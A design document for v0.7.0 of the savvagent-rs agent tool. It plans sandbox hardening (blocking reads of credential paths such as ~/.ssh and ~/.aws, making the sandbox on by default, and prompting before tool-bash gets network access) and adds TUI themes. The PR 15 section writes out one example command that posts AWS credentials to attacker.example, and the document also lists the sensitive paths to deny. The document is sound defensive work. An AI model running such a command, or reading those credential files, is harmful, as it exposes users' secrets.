# v0.7.0 — Sandbox Hardening + Theming — Design

**Issue:** [#17](https://github.com/robhicks/savvagent-rs/issues/17)
**Status:** approved by user 2026-05-11
**Target version:** 0.7.0

## Theme

Sandbox hardening + theming. Closes the §10 backlog "Sandbox: default-on +
scope-tightening" bullet carried since v0.5, plus the `ratatui-themes` ask
(#3). Mirrors the v0.4/v0.5/v0.6 cadence: four independently-reviewable PRs,
each merged before the next opens.

## Cross-cutting changes

Workspace impact:

- New module `crates/savvagent-host/src/sensitive_paths.rs` — single canonical
  source of truth for the sensitive-path list used by `tool-fs`, the
  permission layer, and the OS sandbox. Replaces the in-line `is_sensitive_path`
  in `crates/savvagent-host/src/permissions.rs` (currently only `.env*` and
  `.ssh`) and the equivalent check in `crates/tool-fs/src/lib.rs::check_deny_floor`.
- `Cargo.toml` workspace `[workspace.dependencies]` gains a `ratatui-themes`
  entry (version resolved during PR 16 against the latest crates.io release at
  the time of implementation).
- `crates/savvagent` gains a `theme` module and a `~/.savvagent/theme.toml`
  config file.
- New `SECURITY.md` at repo root (short, ~50 lines): what the sandbox covers,
  what it doesn't, how to disable.

Sequencing is load-bearing: PR 13 (read-side deny floor) must merge before
PR 14 (default-on flip), because PR 14 promotes the sandbox to the default
and we don't want to default-promote a sandbox that still leaks `~/.ssh`.
PRs 15 and 16 are independent and can run in parallel with each other.

Each PR rebases off the most recent `master` so review diffs stay clean.
Comments are resolved on the same branch — no chained PRs.

## PR 13 — Read-side deny floor in the OS sandbox

### Problem

Today the deny floor for sensitive paths is enforced only in-process: `tool-fs`
checks `.env*` / `.ssh` in `check_deny_floor`, and the permission layer's
`is_sensitive_path` covers the same two patterns. The OS sandbox added in
v0.5 (PR 8) constrains *writes* and *network* but does not constrain *reads*.
A compromised tool spawned by any MCP server — including one we don't
control — can still `cat ~/.ssh/id_rsa`, `cat ~/.aws/credentials`, read
browser cookies, etc. PRD §9 calls this out explicitly as a v0.7 task.

### Canonical sensitive-path list

New module `crates/savvagent-host/src/sensitive_paths.rs`:

```rust
/// Sensitive paths whose contents must not be readable, writable, or otherwise
/// accessible by tool spawns regardless of provenance. Used by tool-fs, the
/// permission layer, and the OS sandbox layer.
pub fn sensitive_paths_for_user() -> Vec<PathBuf> { /* … */ }

/// In-process basename/segment check (back-compat with the existing
/// `is_sensitive_path`). Covers `.env*` and any path whose components include
/// any of the sensitive directories below.
pub fn is_sensitive_path(p: &str) -> bool { /* … */ }
```

Paths returned by `sensitive_paths_for_user()` (each expanded against
`$HOME`, missing paths silently skipped):

- `~/.ssh`
- `~/.aws`
- `~/.gnupg`
- `~/.netrc`
- `~/.config/gh`
- `~/.mozilla`
- `~/.config/google-chrome`
- `~/Library/Application Support/Firefox` (macOS only)
- `~/Library/Application Support/Google/Chrome` (macOS only)

`.env*` files are matched dynamically in `is_sensitive_path` against the
target path, not enumerated up front — they live anywhere in the project root.

### Linux — `apply_linux`

For each path returned by `sensitive_paths_for_user()` that exists, append a
hide-mount to the `bwrap` invocation. `bwrap` requires different syntax for
directories and files:

- Directory (e.g. `~/.ssh`, `~/.aws`): `--tmpfs <expanded-path>` — mounts an
  empty in-memory filesystem; reads of any child return ENOENT.
- Regular file (e.g. `~/.netrc`): `--ro-bind /dev/null <expanded-path>` —
  the file appears empty when read.

The helper inspects `Path::is_dir()` (post-canonicalization) to pick the right
form. Symlinks are resolved first so that `~/.aws` → real dir works.

### macOS — `build_macos_profile`

After the existing `(deny file-write*)` block, append:

```scheme
(deny file-read* (subpath "<expanded-path>"))
```

…one clause per existing sensitive path, using the existing `scheme_quote`
helper for escaping. The denial overrides the implicit-allow default; no
explicit allow-list reordering needed.

### Windows

Unchanged — Windows already logs the one-time "sandbox unavailable" warning
and runs unwrapped. AppContainer support is an explicit v0.8 non-goal.

### Tests

- Unit: `sensitive_paths_for_user()` returns at least the always-present
  entries on Linux + macOS, expands `~` correctly, skips paths that don't
  exist on disk.
- Unit: `build_macos_profile` includes a `file-read*` deny clause for each
  passed sensitive path, with `scheme_quote`-escaped paths.
- Unit: `is_sensitive_path` returns `true` for `.env`, `.env.local`,
  `.ssh/id_rsa`, `.aws/credentials`, `.gnupg/private-keys-v1.d/foo.key`.
- Integration (`#[cfg(target_os = "linux")]`): spawn a tool inside the
  sandbox, attempt to read `~/.ssh` and `~/.aws`, assert open fails. Uses
  the existing sandbox test harness.

### Inviolable invariants

- The sensitive-path list lives in exactly one place: `sensitive_paths.rs`.
  Both in-process checks and the OS sandbox derive from it. Drift between
  layers is impossible.
- `--tmpfs` overlay paths must also exist as bind-mount sources up the tree —
  `bwrap` will refuse if a parent isn't bound. The implementation verifies
  parent reachability before appending the overlay.

## PR 14 — Default-on sandbox

### Default flip

`SandboxConfig::default()` returns `enabled: true` (was `false`).

### Migration

`~/.savvagent/sandbox.toml` deserialization:

```rust
#[derive(Deserialize)]
struct SandboxConfigFile {
    #[serde(default = "default_enabled")]
    enabled: bool,
    // … other fields preserved
}

fn default_enabled() -> bool { true }
```

Migration matrix:

| Existing file state                      | Resulting `enabled` |
| ---                                      | ---                 |
| File absent                              | `true`              |
| File exists, no `enabled` key            | `true`              |
| File exists, `enabled = false` explicit  | `false`             |
| File exists, `enabled = true` explicit   | `true`              |

A user who explicitly disabled the sandbox in v0.6 keeps it disabled on
upgrade. A user on default-off (file absent, or partial file) gets the new
default-on behavior.

### UX surface

- `/sandbox status` first-line reflects the new default; existing format
  preserved.
- Startup splash (in `crates/savvagent/src/app.rs`) adds one line:
  `sandbox: on (use /sandbox off to disable)`. Suppressed when the user has
  explicitly set `enabled = false` — those users already chose, no nag.

### `SECURITY.md`

New file at repo root, ~50 lines:

- What the sandbox covers (writes outside project root, network when
  `allow_net = false`, reads of `sensitive_paths_for_user()`).
- What it doesn't (Windows; arbitrary read outside sensitive list;
  domain-level network policy).
- How to disable (`/sandbox off` or set `enabled = false` in
  `~/.savvagent/sandbox.toml`).
- Pointer to the v0.8 roadmap items: Windows AppContainer, domain allowlist,
  macOS profile fuzzing.

### Tests

- Unit: migration matrix above, four cases.
- Existing sandbox tests pass unchanged. The default-config helper in
  `sandbox.rs` tests updates from `config_on()`/`config_off()` to reflect
  the new default but assertion semantics stay the same.

### Inviolable invariants

- Existing `enabled = false` configs survive upgrade — tested.
- The default flip is a one-line change in `default_enabled()` plus the
  migration plumbing; no other behavior change rides in.

## PR 15 — `tool-bash` `allow_net` deny-by-default + permission prompt

### Problem

Today `tool-bash` is registered with `allow_net = Some(true)` in the
sandbox override map (set in v0.5 PR 8 to keep `cargo`, `npm`, `pip`, `curl`
working). With the sandbox going default-on in v0.7, that blanket allow
becomes the largest remaining exfil path: a malicious script in any
dependency can `curl -X POST attacker.example/$(cat ~/.aws/credentials)`.

### Design

Replace the static `allow_net = Some(true)` override with a session-scoped
permission decision driven by the existing M9 permission layer.

- `tool-bash`'s sandbox override default becomes `allow_net = Some(false)`.
- New permission rule `tool_bash.network`, evaluated **once per session on
  the first `tool-bash` invocation** — regardless of whether the trigger is
  the agent calling the tool or the user typing `/bash`. Decision values:
  `Once` / `AlwaysThisSession` / `Deny`. The prompt fires before the spawn;
  the cached decision controls `allow_net` for all subsequent bash spawns
  in the session. Per-call `--net` / `--no-net` flags bypass the cache for
  one invocation but do not update it (see invariants below).
- Two explicit per-call escape hatches:
  - `/bash --net <cmd>` — force `allow_net = true` for this invocation only,
    bypassing the cached decision.
  - `/bash --no-net <cmd>` — force `allow_net = false` for this invocation
    only, bypassing the cached decision.

### Wiring

`tool-bash` already accepts `allow_net` via its sandbox override structure.
The host's `permissions.rs` gains a `BashNetworkPolicy` enum
(`Ask` / `Always` / `Never`) and a `bash_network_decision: Option<bool>`
field on the in-memory session state. The first invocation with
`bash_network_decision == None` triggers the prompt; the result populates
the cache.

`Ask` is the v0.7 default. `Always` and `Never` are reachable via the
existing `~/.savvagent/permissions.toml` for users who want a stable
opt-out / opt-in.

### Slash-command parsing

`crates/savvagent/src/commands.rs` adds `--net` / `--no-net` flag parsing
to `/bash`. Flags must appear before the command body. Unknown flags fall
through to the command body unchanged (preserves the existing UX where the
remainder is treated as raw shell).

### Tests

- Unit: `BashNetworkPolicy::Ask` results in a prompt on first invocation;
  `BashNetworkPolicy::Always` skips the prompt and sets `allow_net = true`;
  `BashNetworkPolicy::Never` skips the prompt and sets `allow_net = false`.
- Unit: `/bash --net foo` produces a parsed command with `net_override =
  Some(true)`; `/bash --no-net foo` produces `net_override = Some(false)`;
  `/bash foo` produces `net_override = None`.
- Unit: session-cached decision is reused across invocations within the
  same session; resetting the session clears the cache.
- Existing `tool-bash` tests pass; the integration tests in
  `crates/tool-bash` need `allow_net = true` set explicitly on the test
  harness (was implicit before).

### Inviolable invariants

- Permission prompts reuse the M9 Ask/Deny/Always primitives. No parallel
  decision system.
- The per-call `--net` / `--no-net` flags **do not** mutate the session
  cache. They are scoped to the single invocation. This prevents one
  `--net` from silently promoting all subsequent bash calls.

### Out of scope

Domain-level allowlisting (e.g. only `crates.io`, `registry.npmjs.org`)
deferred to v0.8. The v0.7 win is "stop blanket-allowing"; granularity
within the network decision is a follow-on.

## PR 16 — `ratatui-themes` integration

### Scope

Pull `ratatui-themes` into the workspace. Ship three built-in themes,
expose a `/theme` slash command, persist selection to disk.

### Built-in themes

- `dark` — matches the current TUI look. New default for new installs.
- `light` — same component layout, light background, accessible contrast
  ratios per WCAG AA.
- `high-contrast` — explicit high-contrast palette, larger emphasis
  differences for accessibility.

Themes map to `ratatui_themes::Theme` values; the bridge module
`crates/savvagent/src/theme.rs` exposes a small `Theme` enum and an
`apply` function called from the render path.

### Slash commands

- `/theme list` — prints available theme names, one per line, with the
  active theme marked.
- `/theme <name>` — sets the active theme. Unknown name prints a warning
  line (`theme `foo` not found — keeping `dark`. available: dark, light,
  high-contrast`) and the active theme is unchanged. **Never crashes.**

### Persistence

`~/.savvagent/theme.toml`:

```toml
theme = "dark"
```

Load at startup; write on every successful `/theme <name>`. File-not-found
on load returns the default (`dark`) silently.

### Tests

- Unit: `theme.toml` round-trip (serialize/deserialize, all three values).
- Unit: unknown name returns `Err` with a useful message; the active
  theme is unchanged.
- Unit: default first-run (no file) returns `Theme::Dark`.
- Manual smoke: switch to each theme in the TUI; confirm header, prompt,
  transcript, and modal rendering all use the new palette.

### Inviolable invariants

- Unknown theme names never crash. Bad config falls back to active theme
  with a warning line.
- Theme is a render-time palette swap. No widget tree restructuring rides
  in.

## Inviolable invariants — release-wide

- The sensitive-path list lives in exactly one place: `sensitive_paths.rs`.
- Existing `enabled = false` sandbox configs are preserved across upgrade.
- Permission prompts for `tool-bash` network reuse the M9 Ask/Deny/Always
  primitives. No parallel decision system.
- Unknown theme names never crash — fall back to active theme.
- Sequencing: PR 13 must merge before PR 14.

## Out of scope (deferred to v0.8+)

- Windows AppContainer + Job Objects.
- macOS profile fuzzing.
- `tool-bash` *domain allowlist* (deny-by-default + prompt ships in v0.7;
  allowlist is a separate v0.8 effort).
- crates.io publication of `savvagent-protocol` / `savvagent-mcp` /
  `savvagent-host`.
- LSP / ACP IDE integration.
- TUI self-update (#2).
- Gemma 4 local provider (#9).
- Context management / retrieval (vecstore — PRD §9).
- Issue #1 (rmcp progress flake on macOS+Windows). `#[cfg(target_os = "linux")]`
  gates remain in place.
